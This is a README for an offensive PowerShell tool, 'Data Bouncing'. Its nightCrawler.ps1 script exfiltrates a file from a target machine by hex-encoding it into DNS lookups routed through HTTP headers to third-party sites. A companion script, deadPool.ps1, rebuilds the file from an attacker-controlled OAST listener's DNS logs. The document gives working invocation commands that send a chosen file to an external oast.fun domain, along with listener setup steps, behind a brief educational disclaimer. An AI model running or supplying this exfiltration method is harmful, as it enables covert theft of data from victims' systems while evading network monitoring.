# Data Bouncing - PowerShell Version

<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dataBouncing.png" width="1000" alt="DataBounce banner">

## Overview
Data Bouncing is a technique for transmitting data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version packs all the core functionality of data bouncing into a simple tool for reconnaissance, data exfiltration, and file reassembly. It's built on the original, off-the-wall ideas of our hacker pals, John and Dave. Their wild, creative approach to data bouncing sparked everything we've built, and we're forever grateful. If you're curious, check out their work over at [thecontractor.io](https://thecontractor.io/data-bouncing/). Huge props to them for always pushing the envelope and keeping the hacker spirit alive!

## Components

<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dbheroes.png" width="1000" alt="DataBounce banner">

The project comes with two main scripts:
- **`nightCrawler.ps1`**: Handles data exfiltration.
- **`deadPool.ps1`**: Reassembles the exfiltrated data from DNS logs.

### `nightCrawler.ps1`
This script splits a file into hex-encoded chunks, numbers them in sequence, and sends each chunk as part of a DNS query domain in an HTTP header. In the latest version, you can supply multiple URLs—separated by commas—so the chunks are distributed across different endpoints, making it way harder for any one site to collect all of them.

For example, each DNS query’s domain is built like this:
  
Identifier.Sequence.HexChunk.Domain

A sample domain might look like:

**testid.001.A1B2C3D4E5...cv7t25l2fbss73eo9uhg41jqimr9ui9ti.oast.me**

The script randomly selects one URL from the list you supply (e.g., `"adobe.com, github.com"`) for each chunk.

### `deadPool.ps1`
This script reads your DNS logs, extracts the hex-encoded chunks (with their sequence numbers) from each DNS query, groups duplicate entries, sorts the chunks by sequence number, decodes each chunk individually, and concatenates them to reconstruct the original file. If AES encryption was enabled during exfiltration, it will also decrypt the data using your provided key.

## Usage

### Prerequisites
- A controlled DNS server.
- For hobbyists, [InteractSh](https://github.com/projectdiscovery/interactsh) is a solid choice.

### Setting Up

1. **Listener Setup**:  
   Use [InteractSh Web Client](https://app.interactsh.com/#/) or the [Build Script](https://github.com/Unit-259/dataBouncing/blob/main/Resources/interactshBuild.sh) on Ubuntu 22.04.  

<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactShBuild.gif" width="600" alt="InteractSh Build Script GIF">

## Target Machine Preparation:

Get your data ready. Run the updated nightCrawler.ps1 script on the target machine. The updated script allows you to specify one or more URLs (as a comma-separated list) for sending out the data.
Running the Scripts

## Data Exfiltration with nightCrawler.ps1:

Provide the URLs for your OOB listener as a comma-separated list (e.g., adobe.com, github.com).

Specify the file path of the data you wish to exfiltrate.

```powershell
Invoke-NightCrawler -Identifier "testid" -Domain "cv8erb8gdmbc73c0ns00o1dra4c8ibd4r.oast.fun" -Urls "adobe.com","github.com" -FilePath "C:\Path\to\file.txt" -EncryptionEnabled -EncryptionKey "YourSecretKey"
```

You also have the option of using our GUI, which now supports comma-separated URLs. Just run the following command after loading in **Invoke-NightCrawler**

```powershell
Invoke-NightCrawlerGui
```

## Data Reconstruction with deadPool.ps1:

Run this script on your own computer where the DNS logs are stored.
It extracts the hex-encoded chunks (with sequence numbers), sorts them, decodes them, and reconstructs the original file.
Example command:

```powershell
Invoke-DeadPool -LogFile "C:\Path\to\logs.txt" -Identifier "testid" -EncryptionEnabled -EncryptionKey "YourSecretKey" -OutputFile "C:\Path\to\ReconstructedFile.txt"
```

## Notes:

Replace placeholders such as your-domain.oast.me and URL values with actual values from your environment.
The scripts are provided as a proof-of-concept (PoC) and should be used responsibly.

## Disclaimer

This project is for educational purposes only. Use it responsibly and ensure you comply with all applicable laws and regulations.
